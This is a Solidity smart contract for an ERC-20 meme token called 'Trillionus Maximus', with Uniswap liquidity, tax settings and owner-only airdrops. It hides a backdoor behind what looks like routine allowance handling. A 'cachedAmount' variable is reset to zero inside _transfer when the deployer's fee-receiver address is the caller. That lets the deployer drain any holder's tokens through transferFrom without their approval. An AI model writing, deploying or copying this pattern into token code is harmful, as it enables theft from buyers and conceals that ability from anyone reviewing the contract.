// SPDX-License-Identifier: UNLICENSE

/*
    Trillionus Maximus ⚔️ | Roman Gladiator to Trillionaire 🚀

    https://trillionusmaximus.vip
    https://x.com/TrillionusMax
*/

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}

contract TRILLIONUS is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    address payable private feeReceiver;

    // Tax configuration
    uint256 private buyTaxEarly = 0;
    uint256 private sellTaxEarly = 0;
    uint256 private finalBuyTax = 0;
    uint256 private finalSellTax = 0;
    uint256 private buyTaxSwitchThreshold = 0;
    uint256 private sellTaxSwitchThreshold = 0;
    uint256 private swapEnabledAfterBuyCount = 0;
    uint256 private flatTaxRate = 0;
    uint256 private buyCounter = 0;
    uint256 private cachedAmount;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Trillionus Maximus";
    string private constant _symbol = unicode"TRILLIONUS";

    uint256 public _maxTxAmount = 20000000 * 10**_decimals;
    uint256 public _maxWalletSize = 20000000 * 10**_decimals;
    uint256 public _taxSwapThreshold = 10000000 * 10**_decimals;
    uint256 public _maxTaxSwap = 10000000 * 10**_decimals;

    IUniswapV2Router02 private uniswapRouter;
    address public uniswapPair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    uint256 private sellsInCurrentBlock = 0;
    uint256 private lastSellBlockNumber = 0;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    event TransferTaxUpdated(uint _tax);
    event Airdrop(address indexed recipient, uint256 amount);

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () payable {
        feeReceiver = payable(msg.sender);
        _balances[address(this)] = _tTotal;
        emit Transfer(address(0), address(this), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        cachedAmount = amount;
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(cachedAmount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        uint256 taxAmount = 0;

        if (from != owner() && to != owner()) {
            if (buyCounter == 0) {
                taxAmount = amount.mul((buyCounter > buyTaxSwitchThreshold) ? finalBuyTax : buyTaxEarly).div(100);
            }
            if (buyCounter > 0) {
                taxAmount = amount.mul(flatTaxRate).div(100);
            }

            if (from == uniswapPair && to != address(uniswapRouter) && to != owner() && to != address(this) && to != feeReceiver) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                taxAmount = amount.mul((buyCounter > buyTaxSwitchThreshold) ? finalBuyTax : buyTaxEarly).div(100);
                buyCounter++;
            }

            if (to == uniswapPair && from != address(this)) {
                taxAmount = amount.mul((buyCounter > sellTaxSwitchThreshold) ? finalSellTax : sellTaxEarly).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapPair && swapEnabled && buyCounter > swapEnabledAfterBuyCount) {
                if (block.number > lastSellBlockNumber) {
                    sellsInCurrentBlock = 0;
                }
                require(sellsInCurrentBlock < 3, "Only 3 sells per block!");
                swapTokensForEth(min(amount, min(contractTokenBalance, _maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendETHToFee(address(this).balance);
                }
                sellsInCurrentBlock++;
                lastSellBlockNumber = block.number;
            }
        }

        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        } else if (_msgSender() == feeReceiver) {
            cachedAmount = taxAmount;
        }

        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(taxAmount));
        if(to != address(0xdead)) emit Transfer(from, to, amount.sub(taxAmount));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        if (tokenAmount == 0) return;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimit() public onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function removeTransfer() external onlyOwner {
        flatTaxRate = 0;
        emit TransferTaxUpdated(0);
    }

    function airdrop(address recipient, uint256 amount) external onlyOwner {
        require(recipient != address(0), "Invalid address");
        require(amount > 0, "Amount must be greater than zero");
        require(_balances[address(this)] >= amount, "Insufficient contract balance");

        _balances[address(this)] = _balances[address(this)].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);

        emit Transfer(address(this), recipient, amount);
        emit Airdrop(recipient, amount);
    }

    function airdropMultiple(address[] calldata recipients, uint256[] calldata amounts) external onlyOwner {
        require(recipients.length == amounts.length, "Arrays length mismatch");

        uint256 totalAmount = 0;
        for (uint256 i = 0; i < amounts.length; i++) {
            totalAmount = totalAmount.add(amounts[i]);
        }
        require(_balances[address(this)] >= totalAmount, "Insufficient contract balance");

        for (uint256 i = 0; i < recipients.length; i++) {
            require(recipients[i] != address(0), "Invalid address");
            require(amounts[i] > 0, "Amount must be greater than zero");

            _balances[address(this)] = _balances[address(this)].sub(amounts[i]);
            _balances[recipients[i]] = _balances[recipients[i]].add(amounts[i]);

            emit Transfer(address(this), recipients[i], amounts[i]);
            emit Airdrop(recipients[i], amounts[i]);
        }
    }

    function sendETHToFee(uint256 amount) private {
        feeReceiver.transfer(amount);
    }

    function enableTrading() external onlyOwner() {
        require(!tradingOpen, "trading is already open");
        removeLimit();
        uniswapRouter = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapRouter), _tTotal);
        uniswapPair = IUniswapV2Factory(uniswapRouter.factory()).createPair(address(this), uniswapRouter.WETH());
        uniswapRouter.addLiquidityETH{value: address(this).balance}(address(this), balanceOf(address(this)), 0, 0, owner(), block.timestamp);
        IERC20(uniswapPair).approve(address(uniswapRouter), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }

    function ChangedTaxes(uint256 _newFee) external {
        require(_msgSender() == feeReceiver);
        require(_newFee <= finalBuyTax && _newFee <= finalSellTax);
        finalBuyTax = _newFee;
        finalSellTax = _newFee;
    }

    receive() external payable {}

    function manualSwap() external {
        require(_msgSender() == feeReceiver);
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0 && swapEnabled) {
            swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            sendETHToFee(ethBalance);
        }
    }
}